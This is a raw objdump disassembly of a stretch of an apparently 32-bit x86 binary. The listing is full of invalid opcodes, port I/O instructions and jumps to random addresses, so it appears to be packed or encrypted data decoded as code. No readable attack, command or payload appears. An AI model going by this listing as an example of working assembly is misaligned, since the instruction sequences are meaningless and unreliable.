  40617f:	lea    esi,[ebx]
  406181:	dec    esi
  406182:	das    
  406183:	fsub   st,st(7)
  406185:	jns    0x406146
  406187:	icebp  
  406188:	cs aaa 
  40618a:	aas    
  40618b:	lea    eax,[ebx]
  40618d:	xor    bh,bh
  40618f:	pop    ebx
  406190:	sti    
  406191:	mov    bh,0x75
  406193:	push   edi
  406194:	xor    ch,BYTE PTR [ecx]
  406196:	popa   
  406197:	inc    ebp
  406198:	add    esp,DWORD PTR [esi]
  40619a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40619b:	mov    esi,0x153761f6
  4061a0:	ins    BYTE PTR es:[edi],dx
  4061a1:	jnp    0x4061e5
  4061a3:	adc    al,0x62
  4061a5:	imul   ah
  4061a7:	or     BYTE PTR [edi+0x1dfcddf0],bl
  4061ad:	xchg   esp,eax
  4061ae:	lahf   
  4061af:	jne    0x406164
  4061b1:	repnz in al,0xb8
  4061b4:	cld    
  4061b5:	mov    ?,WORD PTR [eax]
  4061b7:	dec    edx
  4061b8:	fs lock jg 0x406210
  4061bc:	int    0x1b
  4061be:	adc    al,cl
  4061c0:	jge    0x40622a
  4061c2:	lock cmp al,0x62
  4061c5:	ja     0x40621c
  4061c7:	cmc    
  4061c8:	push   edi
  4061c9:	sub    DWORD PTR [edi],esp
  4061cb:	sub    al,0x4d
  4061cd:	mul    DWORD PTR [edi+0x77]
  4061d0:	mul    BYTE PTR [edi+0x47]
  4061d3:	add    eax,0xf7e68e88
  4061d8:	out    0x2c,eax
  4061da:	stos   DWORD PTR es:[edi],eax
  4061db:	mov    esi,0x9d232c5
  4061e0:	jmp    0xf8944968
  4061e5:	cmp    BYTE PTR [ecx-0x2b],0xa0
  4061e9:	mov    edi,0x4268ec2b
  4061ee:	jg     0x4061a6
  4061f0:	jmp    0xe78ddc3c
  4061f5:	fst    DWORD PTR [esi]
  4061f7:	(bad)  
  4061f8:	jmp    0x4061ae
  4061fa:	dec    esp
  4061fb:	push   esi
  4061fc:	add    ebx,DWORD PTR [ebx]
  4061fe:	xchg   DWORD PTR [ebx],ebx
  406200:	sbb    DWORD PTR [esi-0x16],ecx
  406203:	ss cmp eax,0xb559cd14
  406209:	bound  ebx,QWORD PTR [esi-0x4]
  40620c:	dec    ebp
  40620d:	int3   
  40620e:	imul   edx,DWORD PTR [ebp+0x5a],0xae22effc
  406215:	adc    al,0x76
  406217:	out    0x23,eax
  406219:	fwait
  40621a:	stos   DWORD PTR es:[edi],eax
  40621b:	or     eax,0x579d1b29
  406220:	cmp    bh,BYTE PTR [ebp+esi*2-0x11]
  406224:	ins    BYTE PTR es:[edi],dx
  406225:	sahf   
  406226:	mov    dh,0x1c
  406228:	das    
  406229:	aas    
  40622a:	sbb    DWORD PTR [ebx-0x2f1adb9],eax
  406230:	rcr    ecx,0x6a
  406233:	repnz and eax,0x3abbe4bc
  406239:	dec    ecx
  40623a:	cmc    
  40623b:	fiadd  DWORD PTR [edi]
  40623d:	cmp    BYTE PTR [eax+ebx*4+0x4c],0x30
  406242:	push   ds
  406243:	cld    
  406244:	mov    edx,0x61cf3991
  406249:	je     0x4062b0
  40624b:	inc    esi
  40624c:	das    
  40624d:	cmc    
  40624e:	pusha  
  40624f:	dec    ebp
  406250:	pop    ds
  406251:	pop    edx
  406252:	sub    eax,0xa5f2cac4
  406257:	jecxz  0x4062c7
  406259:	outs   dx,BYTE PTR ds:[esi]
  40625a:	(bad)  
  40625b:	popf   
  40625c:	jmp    0x62cc:0xfd06c6b4
  406263:	or     ecx,edi
  406265:	sub    BYTE PTR [edx+ebp*2+0x3c214195],0xcc
  40626d:	repz or esp,DWORD PTR [ecx-0x5c]
  406271:	pushf  
  406272:	push   ebp
  406273:	mov    cl,0xa6
  406275:	je     0x4062a8
  406277:	inc    esi
  406278:	pop    esi
  406279:	(bad)  
  40627a:	sbb    edx,DWORD PTR [edi]
  40627c:	mov    ecx,0x8bee7a65
  406281:	das    
  406282:	fs mov ecx,0xb2b313fd
  406288:	sbb    esi,esp
  40628a:	inc    edx
  40628b:	cmp    ecx,DWORD PTR [edx]
  40628d:	push   ss
  40628e:	push   0x91511e7d
  406293:	sub    ebx,DWORD PTR [ebx+0x8]
  406296:	jne    0x4062fd
  406298:	daa    
  406299:	push   ds
  40629a:	lds    edx,FWORD PTR [ecx-0x3f]
  40629d:	or     DWORD PTR [edi],esi
  40629f:	scas   eax,DWORD PTR es:[edi]
  4062a0:	sub    esp,DWORD PTR ds:0xa4857e27
  4062a6:	dec    edx
  4062a7:	mov    ebx,0x5f8e1d37
  4062ac:	stc    
  4062ad:	div    BYTE PTR [eax+0xe]
  4062b0:	xchg   edi,eax
  4062b1:	pop    eax
  4062b2:	add    al,bl
  4062b4:	fisubr DWORD PTR [ebx]
  4062b6:	xchg   edi,eax
  4062b7:	iret   
  4062b8:	(bad)  
  4062ba:	mov    ds:0x88f6a40b,al
  4062bf:	push   ss
  4062c0:	pop    ebp
  4062c1:	adc    al,0x3a
  4062c3:	jnp    0x406264
  4062c5:	std    
  4062c6:	sbb    eax,0xf94eeece
  4062cb:	adc    al,0xf
  4062cd:	mov    edx,0x5f5fcb3f
  4062d2:	rol    dh,0xec
  4062d5:	xchg   ecx,eax
  4062d6:	test   DWORD PTR [eax],esp
  4062d8:	push   0x2e530ce6
  4062dd:	neg    edx
  4062df:	push   es
  4062e0:	push   ds
  4062e1:	rcr    DWORD PTR [ebx+edi*2+0x783561e9],cl
  4062e8:	add    ebp,DWORD PTR [eax+0x32]
  4062eb:	pop    ss
  4062ec:	jmp    0x22da85bf
  4062f1:	dec    ecx
  4062f2:	popf   
  4062f3:	outs   dx,BYTE PTR ds:[esi]
  4062f4:	pop    eax
  4062f5:	and    BYTE PTR [edx],bh
  4062f7:	fcom   st(6)
  4062f9:	aaa    
  4062fa:	call   0x2823b7fe
  4062ff:	sbb    al,0xf5
  406301:	add    ebp,ecx
  406303:	aas    
  406304:	into   
  406305:	adc    ecx,eax
  406307:	icebp  
  406308:	dec    edi
  406309:	jge    0x4062b8
  40630b:	mov    dh,0x60
  40630d:	out    0xc9,al
  40630f:	ss dec eax
  406311:	loopne 0x40635b
  406313:	ja     0x4062f3
  406315:	ror    BYTE PTR [ecx+0x38429f60],cl
  40631b:	popa   
  40631c:	call   0xa6d8:0xa2c89b59
  406323:	cdq    
  406324:	sub    DWORD PTR [edi],edi
  406326:	in     al,dx
  406327:	ror    BYTE PTR [edx],cl
  406329:	inc    edx
  40632a:	in     eax,0x6c
  40632c:	aam    0x93
  40632e:	adc    bl,bl
  406330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406331:	test   BYTE PTR [ecx],ah
  406333:	loopne 0x4062f8
  406335:	test   al,0x4f
  406337:	inc    edx
  406338:	aaa    
  406339:	and    DWORD PTR [ebp-0xe],edx
  40633c:	jl     0x40639b
  40633e:	les    esp,FWORD PTR [edi-0x20]
  406341:	pop    esi
  406342:	pop    ebx
  406343:	mov    dh,BYTE PTR [esi]
  406345:	into   
  406346:	and    eax,0xee66d1c3
  40634b:	lock sub al,0xae
  40634e:	cwde   
  40634f:	xlat   BYTE PTR ds:[ebx]
  406350:	push   0xffffffd9
  406352:	test   ebp,esi
  406354:	jge    0x4062f6
  406356:	jae    0x4063d2
  406358:	push   0xffffffe2
  40635a:	add    BYTE PTR [edi+0x16],bh
  40635d:	xor    ebx,DWORD PTR [ebp-0x5e]
  406360:	in     al,dx
  406361:	sub    BYTE PTR ds:0x82b74b89,bh
  406367:	sub    ebx,DWORD PTR [eax]
  406369:	aas    
  40636a:	or     ah,BYTE PTR [esi-0x36]
  40636d:	rcl    DWORD PTR [ebx-0x54895a30],cl
  406373:	arpl   ax,sp
  406375:	loopne 0x40639b
  406377:	mov    al,ds:0xfda8b556
  40637c:	rol    bh,0xb1
  40637f:	or     BYTE PTR [edi+0xf],al
  406382:	inc    edx
  406383:	jmp    0xf0f0:0xbb50fa85
  40638a:	sub    bh,BYTE PTR [esi]
  40638c:	fild   QWORD PTR [ecx-0x7a]
  40638f:	das    
  406390:	loopne 0x406394
  406392:	sub    ch,BYTE PTR [ebx+0x6c68244e]
  406398:	inc    ebx
  406399:	repnz push cs
  40639b:	pop    esp
  40639c:	(bad)  
  40639d:	xchg   ebx,eax
  40639e:	cmp    BYTE PTR [esi],dl
  4063a0:	push   edx
  4063a1:	retf   
  4063a2:	(bad)  
  4063a3:	sti    
  4063a4:	lds    esp,FWORD PTR [ebp+0xbe8a442]
  4063aa:	mov    dh,0xd9
  4063ac:	mov    ah,0xc9
  4063ae:	fisttp WORD PTR [eax-0x2114dcdf]
  4063b4:	push   edx
  4063b5:	push   esp
  4063b6:	int    0x26
  4063b8:	sbb    DWORD PTR [esi-0x50],edi
  4063bb:	and    DWORD PTR [eax-0x311f8d82],edi
  4063c1:	sub    BYTE PTR ds:0x56d1cfd1,bl
  4063c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063c8:	mov    esp,0x309bc5b0
  4063cd:	sub    ebx,DWORD PTR [edx+0x64aa8a8]
  4063d3:	fisttp QWORD PTR [ebx-0x53]
  4063d6:	fdivr  DWORD PTR [edi+0x7da0288]
  4063dc:	ret    0xfad3
  4063df:	push   esi
  4063e0:	jmp    0x40641d
  4063e2:	sbb    BYTE PTR [ebp-0x667370a9],ah
  4063e8:	xor    edx,DWORD PTR [edi]
  4063ea:	sub    DWORD PTR [edx+0x4f],0xffffffcc
  4063ee:	and    al,0x9
  4063f0:	pop    ss
  4063f1:	(bad)  
  4063f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063f3:	data16 or al,0xca
  4063f6:	out    dx,al
  4063f7:	push   es
  4063f8:	mov    edx,0xa02eba6f
  4063fd:	arpl   WORD PTR [ecx],bp
  4063ff:	mov    BYTE PTR [ecx-0x4d40c769],bl
  406405:	sbb    al,0xe4
  406407:	mov    bh,0xb2
  406409:	(bad)
  40640e:	popa   
  40640f:	cmp    ebx,0x3d1f2611
  406415:	inc    edx
  406416:	out    dx,eax
  406417:	mov    ecx,0x223f6538
  40641c:	xor    edx,DWORD PTR [eax+eax*1+0x69]
  406420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406421:	je     0x4063e1
  406423:	daa    
  406424:	xchg   edx,eax
  406425:	repz loop 0x406426
  406428:	sbb    edi,DWORD PTR [ecx]
  40642a:	xlat   BYTE PTR ds:[ebx]
  40642b:	jb     0x40649e
  40642d:	pushf  
  40642e:	add    eax,esp
  406430:	scas   eax,DWORD PTR es:[edi]
  406431:	jns    0x40646b
  406433:	in     al,0xe7
  406435:	ds adc cl,ah
  406438:	inc    ebp
  406439:	fsub   DWORD PTR [esi]
  40643b:	ja     0x406411
  40643d:	sbb    ecx,ecx
  40643f:	sub    bh,BYTE PTR [ebp+ebp*8+0x2168a195]
  406446:	ja     0x40641f
  406448:	push   0x3a
  40644a:	ror    DWORD PTR [ebx+0x2],0xcd
  40644e:	jl     0x40641b
  406450:	push   ecx
  406451:	sar    ebp,0xe3
  406454:	sti    
  406455:	pop    ebx
  406456:	fdiv   st(2),st
  406458:	or     DWORD PTR [ebx-0x409e9fdf],edi
  40645e:	inc    esi
  40645f:	xchg   BYTE PTR [edi+0x1412e229],dl
  406465:	icebp  
  406466:	pop    edx
  406467:	sar    BYTE PTR [ecx],cl
  406469:	es jne 0x406412
  40646c:	add    eax,0x3c85581b
  406471:	inc    edi
  406472:	mov    BYTE PTR [edx-0x5be4f86f],dl
  406478:	mov    esi,0x1986cd78
  40647d:	mov    ds:0x19df820c,eax
  406482:	pop    edx
  406483:	mov    ch,0xa5
  406485:	push   esp
  406486:	mov    ds:0xe1dcba1e,eax
  40648b:	and    edx,DWORD PTR [edi+0x40e498f]
  406491:	shl    BYTE PTR [ebx-0x14dcecf6],1
  406497:	and    ebp,DWORD PTR [eax+0x2224dcfc]
  40649d:	sub    DWORD PTR [ebp+0x3e63f8bb],edx
  4064a3:	les    edi,FWORD PTR [eax]
  4064a5:	jg     0x40646a
  4064a7:	out    0x38,al
  4064a9:	inc    edx
  4064aa:	push   eax
  4064ab:	(bad)  
  4064ac:	stos   BYTE PTR es:[edi],al
  4064ad:	push   ds
  4064ae:	inc    ecx
  4064af:	mov    ds,WORD PTR [edx]
  4064b1:	mov    dl,0xa4
  4064b3:	push   esi
  4064b4:	cmp    esp,esp
  4064b6:	sub    al,0xbb
  4064b8:	lahf   
  4064b9:	aad    0xa5
  4064bb:	enter  0xaad1,0x74
  4064bf:	scas   al,BYTE PTR es:[edi]
  4064c0:	sub    bl,BYTE PTR [esp+edx*8-0x7df18141]
  4064c7:	fisubr DWORD PTR [ecx+0x7d]
  4064ca:	shl    bh,cl
  4064cc:	pop    ss
  4064cd:	bnd jge 0x40649f
  4064d0:	and    BYTE PTR [esp+eiz*8],bl
  4064d3:	dec    edi
  4064d4:	jl     0x40645c
  4064d6:	data16 in al,0x65
  4064d9:	rcr    BYTE PTR [edx+ecx*2],1
  4064dc:	sbb    al,0xe0
  4064de:	sti    
  4064df:	add    al,0x49
  4064e1:	mov    dh,0xe7
  4064e3:	cmp    bl,cl
  4064e5:	sbb    BYTE PTR [bp+di-0x3],ch
  4064e9:	jo     0x4064a4
  4064eb:	dec    edi
  4064ec:	(bad)
  4064ef:	sti    
  4064f0:	cmp    al,0x85
  4064f2:	or     ch,bh
  4064f4:	xchg   ecx,eax
  4064f5:	pop    ecx
  4064f6:	(bad)  
  4064f7:	pushf  
  4064f8:	es inc esp
  4064fa:	push   edx
  4064fb:	call   DWORD PTR [edi+ebp*8-0x7f450bb6]
  406502:	test   eax,0xa0434303
  406507:	push   0xa839a4bf
  40650c:	xchg   cl,dh
  40650e:	test   al,0x35
  406510:	repz xor ah,BYTE PTR [esp+esi*2]
  406514:	add    eax,0xa1623de9
  406519:	in     al,dx
  40651a:	das    
  40651b:	cwde   
  40651c:	pop    ebx
  40651d:	xor    al,0x5b
  40651f:	mov    eax,ds:0x6ee93e75
  406524:	inc    edx
  406525:	dec    esp
  406526:	retf   
  406527:	dec    esi
  406528:	ror    BYTE PTR [eax],cl
  40652a:	pop    esi
  40652b:	xor    DWORD PTR [esp+edi*4-0x2ba57ab8],edx
  406532:	std    
  406533:	in     al,0xf3
  406535:	out    0x4b,eax
  406537:	ins    BYTE PTR es:[edi],dx
  406538:	mov    ecx,0x5de9ebc8
  40653d:	dec    ebp
  40653e:	int    0x3
  406540:	cmp    ah,ch
  406542:	les    esp,FWORD PTR [edi]
  406544:	pop    ss
  406545:	sar    BYTE PTR [ecx+0x1c1a87dd],0xb4
  40654c:	loop   0x4064ec
  40654e:	add    bh,ah
  406550:	inc    eax
  406551:	sub    DWORD PTR [esi],esp
  406553:	mov    ebp,DWORD PTR [ecx-0x6b]
  406556:	test   al,0x11
  406558:	fcmovbe st,st(2)
  40655a:	mov    dl,0xed
  40655c:	fdivp  st(2),st
  40655e:	inc    ecx
  40655f:	lds    ecx,FWORD PTR [eax+0x77a0bc51]
  406565:	add    al,0x8a
  406567:	sbb    al,0xaa
  406569:	fstp   DWORD PTR [edx-0x1c]
  40656c:	jo     0x406575
  40656e:	iret   
  40656f:	adc    eax,0x3d394df0
  406574:	nop
  406575:	fs pop edi
  406577:	push   ebx
  406578:	jno    0x406577
  40657a:	adc    eax,0xb6087774
  40657f:	xchg   BYTE PTR [esi+ebx*1],al
  406582:	jl     0x406551
  406584:	leave  
  406585:	and    eax,0x68016535
  40658a:	mov    eax,0x848d2aae
  40658f:	into   
  406590:	pop    ds
  406591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406593:	or     BYTE PTR [eax-0x78ee5606],0xcf
  40659a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40659b:	ret    0xa321
  40659e:	dec    esp
  40659f:	pop    esp
  4065a0:	pushf  
  4065a1:	stc    
  4065a2:	aad    0x92
  4065a4:	nop
  4065a5:	push   ebp
  4065a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065a7:	(bad)  
  4065a8:	lock cdq 
  4065aa:	repnz loopne 0x406541
  4065ad:	imul   esp,DWORD PTR [ebx+0x75864bee],0xdd086ef5
  4065b7:	sbb    dl,BYTE PTR [ebp+0x29809d81]
  4065bd:	retf   0xc3c8
  4065c0:	push   eax
  4065c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065c2:	ror    BYTE PTR [ecx],0x4b
  4065c5:	repnz pusha 
  4065c7:	dec    ecx
  4065c8:	xlat   BYTE PTR ds:[ebx]
  4065c9:	cwde   
  4065ca:	ret    0x6c02
  4065cd:	out    0x3a,al
  4065cf:	dec    esp
  4065d0:	dec    ecx
  4065d1:	es or  eax,0x96e4a259
  4065d7:	pop    ebx
  4065d8:	mov    ?,WORD PTR [edx-0x4079d435]
  4065de:	and    eax,0xacfc45ab
  4065e3:	and    eax,0x7e24b55d
  4065e8:	inc    esp
  4065e9:	add    edi,ecx
  4065eb:	sbb    ch,BYTE PTR [ebx-0x65]
  4065ee:	(bad)  
  4065ef:	call   FWORD PTR [ebp+eiz*4+0x3c]
  4065f3:	in     eax,dx
  4065f4:	sub    bh,BYTE PTR [edi-0x8f281cf]
  4065fa:	int3   
  4065fb:	add    al,0xa5
  4065fd:	cmp    BYTE PTR [edi-0x5b],cl
  406600:	lds    esp,FWORD PTR [ecx]
  406602:	jecxz  0x406586
  406604:	out    0xa1,al
  406606:	xor    ecx,edi
  406608:	cmp    eax,0x78d36ec
  40660d:	xor    BYTE PTR [edi],0xab
  406610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406611:	lahf   
  406612:	int    0x56
  406614:	sahf   
  406615:	call   0xe7b8:0xec5cabe3
  40661c:	sub    BYTE PTR [ebp-0x54],ch
  40661f:	pusha  
  406620:	shl    BYTE PTR [ecx],1
  406622:	push   ds
  406623:	inc    esp
  406624:	sub    eax,0xb92daa97
  406629:	sbb    edi,DWORD PTR [ecx]
  40662b:	xor    al,0xc0
  40662d:	enter  0x2694,0xba
  406631:	inc    ebp
  406632:	xchg   esi,eax
  406633:	mov    al,ds:0x6c5ea050
  406638:	cmp    esi,eax
  40663a:	jno    0x4065d3
  40663c:	jb     0x4066aa
  40663e:	in     eax,0x22
  406640:	xor    edi,DWORD PTR [esi-0x789e4d26]
  406646:	les    ecx,FWORD PTR [ebx]
  406648:	repnz in eax,0x2
  40664b:	cmp    BYTE PTR [eax+0x8d0c090],bh
  406651:	mov    dh,0x47
  406653:	imul   eax,DWORD PTR [esi+0xc],0x47772d13
  40665a:	test   al,0x58
  40665c:	in     al,dx
  40665d:	sbb    ebp,esp
  40665f:	nop
  406660:	fistp  DWORD PTR [ebp-0x41]
  406663:	fwait
  406664:	inc    edi
  406665:	sub    ah,bl
  406667:	push   0xe456f198
  40666c:	mov    dl,0x93
  40666e:	inc    edi
  40666f:	inc    esi
  406670:	fstp   QWORD PTR [edi]
  406672:	mov    bl,BYTE PTR [ecx+0x780ea9e9]
  406678:	pop    ecx
  406679:	sub    DWORD PTR [eax-0x5aadad06],ebx
  40667f:	pop    ds
  406680:	mov    bl,0x31
  406682:	sbb    cl,dl
  406684:	mov    esi,0xf68412b
  406689:	pushf  
  40668a:	sbb    eax,0x266fcc5
  40668f:	mov    ecx,0xa7c4a3b0
  406694:	cwde   
  406695:	(bad)  
  406696:	sub    ebp,DWORD PTR [edi+0x597e9e77]
  40669c:	sbb    DWORD PTR [edi+ebx*1-0x56],edx
  4066a0:	jecxz  0x406638
  4066a2:	mov    dl,0xe2
  4066a4:	mov    ds:0xa92ff97b,eax
  4066a9:	or     DWORD PTR [eax+0x21d1be19],ecx
  4066af:	lods   eax,DWORD PTR ds:[esi]
  4066b0:	shr    DWORD PTR [ebx-0x25127e88],0x77
  4066b7:	pop    esi
  4066b8:	sbb    ebp,ebx
  4066ba:	mov    bh,0x7a
  4066bc:	lds    edx,FWORD PTR [eax-0x50db58f6]
  4066c2:	or     cl,BYTE PTR [eax]
  4066c4:	lea    ecx,[ebp+0x2bcad928]
  4066ca:	push   edi
  4066cb:	jmp    0x9e19027
  4066d0:	retf   0xf66a
  4066d3:	out    0xf0,al
  4066d5:	or     al,0xe8
  4066d7:	es shr dl,cl
  4066da:	pop    esi
  4066db:	call   0xa1f7:0xabbd907c
  4066e2:	sti    
  4066e3:	jb     0x40666a
  4066e5:	jl     0x406764
  4066e7:	inc    esi
  4066e8:	adc    DWORD PTR [edi+0x33],esi
  4066eb:	add    bl,dh
  4066ed:	adc    ah,bl
  4066ef:	repnz mov dh,0xf3
  4066f2:	jne    0x4066f7
  4066f4:	(bad)  
  4066f6:	cmp    esp,DWORD PTR [esi-0x24]
  4066f9:	addr16 std 
  4066fb:	mov    ds,WORD PTR [ebx+0x6d85db16]
  406701:	loopne 0x4066bd
  406703:	mov    ?,WORD PTR [ebx+0x22]
  406706:	push   ebp
  406707:	mov    dh,al
  406709:	mov    dh,BYTE PTR [edi-0x7c]
  40670c:	jb     0x4066df
  40670e:	je     0x406770
  406710:	mov    edx,0x3a7aa98e
  406715:	jne    0x4066d6
  406717:	xor    DWORD PTR [esi],esi
  406719:	jp     0x4066ce
  40671b:	jmp    0x406722
  40671d:	clc    
  40671e:	mov    dl,0xf6
  406720:	jnp    0x406750
  406722:	sbb    ch,BYTE PTR [ebx+0x77]
  406725:	icebp  
  406726:	jge    0x40675e
  406728:	and    esp,DWORD PTR [ebp+0x54]
  40672b:	fwait
  40672c:	(bad)  
  40672d:	(bad)  
  40672e:	fmul   DWORD PTR [ecx-0x6]
  406731:	rcl    BYTE PTR [ecx],cl
  406733:	(bad)  
  406734:	stos   DWORD PTR es:[edi],eax
  406735:	sub    bh,cl
  406737:	sub    al,0xe7
  406739:	xchg   ecx,eax
  40673a:	scas   eax,DWORD PTR es:[edi]
  40673b:	inc    edi
  40673c:	das    
  40673d:	mov    esp,0xed96d9d6
  406742:	add    eax,0xf555f9b1
  406747:	es add esp,edx
  40674a:	mov    ecx,ebp
  40674c:	nop
  40674d:	xchg   ecx,eax
  40674e:	pop    ecx
  40674f:	and    ch,bh
  406751:	dec    esi
  406752:	addr16 mov cl,0x72
  406755:	out    dx,al
  406756:	addr16 sub al,0xd2
  406759:	outs   dx,WORD PTR ds:[esi]
  40675b:	mov    ds:0xe2978d96,eax
  406760:	add    DWORD PTR [ebx],edx
  406762:	push   ds
  406763:	pop    edi
  406764:	mov    al,0xb4
  406766:	bound  ebp,QWORD PTR [ebx]
  406768:	fst    QWORD PTR [edx-0x7761e10d]
  40676e:	jg     0x40675c
  406770:	mov    dh,0x2f
  406772:	and    bh,bh
  406774:	and    al,0x76
  406776:	fidiv  DWORD PTR [edi-0x1619513b]
  40677c:	pop    es
  40677d:	pop    edi
  40677e:	fadd   QWORD PTR [eax-0x6a]
  406781:	out    dx,al
  406782:	or     esi,DWORD PTR [eax+0x4a]
  406785:	call   0x35ec8d21
  40678a:	mov    al,ds:0xd19e5265
  40678f:	pop    ss
  406790:	stos   BYTE PTR es:[edi],al
  406791:	sar    DWORD PTR [esi-0x74],0xae
  406795:	shl    BYTE PTR [edx-0x48890262],0xfc
  40679c:	ret    
  40679d:	ins    BYTE PTR es:[edi],dx
  40679e:	call   DWORD PTR [edi]
  4067a0:	xor    al,ah
  4067a2:	sbb    esi,DWORD PTR [ebx]
  4067a4:	enter  0x4104,0x44
  4067a8:	fistp  WORD PTR [ecx-0x61]
  4067ab:	xor    bl,BYTE PTR [ebx-0x15982d12]
  4067b1:	and    al,0xeb
  4067b3:	pop    esi
  4067b4:	xlat   BYTE PTR ds:[ebx]
  4067b5:	out    dx,eax
  4067b6:	outs   dx,BYTE PTR ds:[esi]
  4067b7:	jmp    0x88ebc020
  4067bc:	inc    ebp
  4067bd:	xchg   esp,eax
  4067be:	xor    esp,0xf0b4da42
  4067c4:	push   edi
  4067c5:	test   eax,0xd54583af
  4067ca:	aaa    
  4067cb:	imul   esi,esp,0xdf11b05f
  4067d1:	pop    es
  4067d2:	in     eax,dx
  4067d3:	daa    
  4067d4:	xchg   esi,eax
  4067d5:	jb     0x406776
  4067d7:	loop   0x406844
  4067d9:	jo     0x4067fc
  4067db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067dc:	jb     0x406848
  4067de:	push   cs
  4067df:	or     DWORD PTR [edx-0x32],edx
  4067e2:	in     al,dx
  4067e3:	sar    BYTE PTR [eax+ecx*4+0x78122266],1
  4067ea:	cmp    edi,edx
  4067ec:	inc    eax
  4067ed:	inc    esp
  4067ee:	cli    
  4067ef:	not    BYTE PTR [eax-0x289c0331]
  4067f5:	sub    BYTE PTR [ecx+0x5ca11b82],ah
  4067fb:	loop   0x40681c
  4067fd:	int    0xec
  4067ff:	dec    edx
  406800:	popa   
  406801:	pop    ds
  406802:	lock adc DWORD PTR [edx+eax*1-0x79937bba],edi
  40680a:	mov    eax,ds:0xdbac26b2
  40680f:	pop    es
  406810:	xlat   BYTE PTR ds:[ebx]
  406811:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406812:	leave  
  406813:	int3   
  406814:	fdiv   DWORD PTR [esi]
  406816:	mov    ebp,0x8ada8dab
  40681b:	push   ecx
  40681c:	inc    eax
  40681d:	adc    eax,0x9d3ef071
  406822:	mov    eax,0xc70f0213
  406827:	xchg   esi,eax
  406828:	gs inc ebp
  40682a:	das    
  40682b:	adc    eax,0x117300c9
  406830:	cli    
  406831:	clc    
  406832:	aas    
  406833:	push   ss
  406834:	add    BYTE PTR [edx+0xd9527a],bl
  40683a:	lods   al,BYTE PTR ds:[esi]
  40683b:	add    ebp,eax
  40683d:	pop    esp
  40683e:	div    DWORD PTR [esi+ebp*4-0x4135a76d]
  406845:	jns    0x4068b5
  406847:	push   es
  406848:	mov    BYTE PTR [ebp+0x35d6430],dh
  40684e:	jle    0x40689d
  406850:	and    DWORD PTR [edi],eax
  406852:	idiv   BYTE PTR gs:[ebx-0x57]
  406856:	sub    BYTE PTR [ecx-0x32],ah
  406859:	dec    esp
  40685a:	inc    edi
  40685b:	push   ss
  40685c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40685d:	jb     0x40680b
  40685f:	xchg   ebx,eax
  406860:	(bad)  
  406861:	sub    dl,cl
  406863:	dec    ebx
  406864:	das    
  406865:	mov    ch,0x0
  406867:	cmp    al,0x4e
  406869:	jnp    0x4068a2
  40686b:	imul   esi,DWORD PTR [edx+0x55b286bb],0xffffff81
  406872:	sbb    ebx,DWORD PTR [esi]
  406874:	sub    bh,bh
  406876:	(bad)  
  406877:	out    dx,eax
  406878:	mov    esp,DWORD PTR [ebp+0x2c]
  40687b:	ins    BYTE PTR es:[edi],dx
  40687c:	pusha  
  40687d:	xor    cl,BYTE PTR [ecx]
  40687f:	fwait
  406880:	and    ebx,DWORD PTR [ecx+0x32]
  406883:	push   cs
  406884:	aaa    
  406885:	dec    ebx
  406886:	cmp    DWORD PTR ds:0xfcfbd891,0xd0017734
  406890:	outs   dx,DWORD PTR ds:[esi]
  406891:	xor    ah,cl
  406893:	bound  esi,QWORD PTR [ecx]
  406895:	std    
  406896:	repz fld DWORD PTR [edx]
  406899:	and    eax,0x7fc652a1
  40689e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40689f:	ds sbb eax,0x9e56000c
  4068a5:	xchg   ecx,eax
  4068a6:	inc    esp
  4068a7:	sub    eax,0x89eb2642
  4068ac:	jb     0x406850
  4068ae:	stc    
  4068af:	mov    ebx,ds
  4068b1:	xlat   BYTE PTR ds:[ebx]
  4068b2:	xor    eax,0xd062a591
  4068b7:	data16 jg 0x406902
  4068ba:	xchg   ebp,eax
  4068bb:	enter  0xdb38,0x5c
  4068bf:	fidiv  WORD PTR [ebx+0x15678b3d]
  4068c5:	cmp    eax,DWORD PTR [ecx-0x7e583442]
  4068cb:	repnz pushf 
  4068cd:	or     dl,dl
  4068cf:	xor    DWORD PTR [edx+edi*4],edx
  4068d2:	rcl    BYTE PTR ds:[ebx+0x2b46e8ff],0xf8
  4068da:	cmp    edi,ebp
  4068dc:	inc    esp
  4068dd:	dec    edx
  4068de:	sub    eax,DWORD PTR [eax-0x5354fd4c]
  4068e4:	mov    dh,0x2b
  4068e6:	mov    ecx,DWORD PTR [esi-0x53e382cf]
  4068ec:	adc    al,0x62
  4068ee:	mov    ah,0x67
  4068f0:	sbb    eax,0x2b504c3b
  4068f5:	sti    
  4068f6:	mov    DWORD PTR [edx],esi
  4068f8:	in     al,0x6
  4068fa:	ds xchg esi,eax
  4068fc:	inc    esi
  4068fd:	jecxz  0x4068b9
  4068ff:	pop    ebp
  406900:	push   eax
  406901:	daa    
  406902:	sub    al,0x78
  406904:	mov    dh,0x7
  406906:	mov    ebx,0x32201540
  40690b:	xchg   ebx,eax
  40690c:	mov    ebp,0xeda72bd4
  406911:	pop    esi
  406912:	mov    cl,0x54
  406914:	xchg   ecx,eax
  406915:	jo     0x406991
  406917:	ins    BYTE PTR es:[edi],dx
  406918:	sbb    ebp,DWORD PTR [edx+0x5f]
  40691b:	xchg   esp,eax
  40691c:	inc    ebx
  40691d:	std    
  40691e:	mov    esi,0xce649df4
  406923:	pop    ebp
  406924:	bound  esp,QWORD PTR [ecx]
  406926:	aam    0xef
  406928:	push   0x49ce127f
  40692d:	mov    ecx,0xbb4dd60c
  406932:	xor    edx,DWORD PTR [edx+0x32f0be3e]
  406938:	xchg   ecx,eax
  406939:	loop   0x406951
  40693b:	sbb    DWORD PTR [edx-0x12],ebp
  40693e:	mov    edx,0x3f4d3848
  406943:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406944:	or     DWORD PTR [eax],0xffffff86
  406947:	pop    ecx
  406948:	pushf  
